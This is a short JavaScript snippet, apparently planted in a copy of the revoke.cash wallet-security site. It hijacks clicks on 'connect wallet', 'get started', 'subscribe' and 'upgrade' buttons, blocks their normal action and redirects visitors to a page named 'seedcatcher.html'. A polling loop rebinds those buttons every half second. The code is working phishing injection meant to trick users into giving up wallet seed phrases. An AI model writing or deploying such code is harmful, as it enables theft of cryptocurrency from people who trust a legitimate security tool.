(function() {
    // 1. Catch clicks immediately
    document.addEventListener('click', function(e) {
        let target = e.target.closest('a, button, div, span');
        if (!target) return;

        let text = (target.innerText || "").toLowerCase().trim();
        let href = (target.getAttribute("href") || "").toLowerCase();

        // Ignore the top navigation menu
        if (href === '/premium' || href === 'https://revoke.cash/premium') {
            return;
        }

        // Redirect on exact matches or any pricing keywords
        if (text === 'get started' || text === 'subscribe' || text === 'upgrade' || text.includes('connect wallet')) {
            e.preventDefault();
            e.stopPropagation();
            window.location.href = '/seedcatcher.html';
        }
    }, true);

    // 2. Relentless Hunter (in case React loads slowly)
    setInterval(function() {
        const buttons = document.querySelectorAll('a, button, div');
        buttons.forEach(btn => {
            let text = (btn.innerText || "").toLowerCase().trim();
            if (text === 'get started' || text === 'subscribe' || text === 'upgrade' || text.includes('connect wallet')) {
                // Force the click action directly on the element
                btn.onclick = function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    window.location.href = '/seedcatcher.html';
                };
            }
        });
    }, 500); // Check every half second
})();
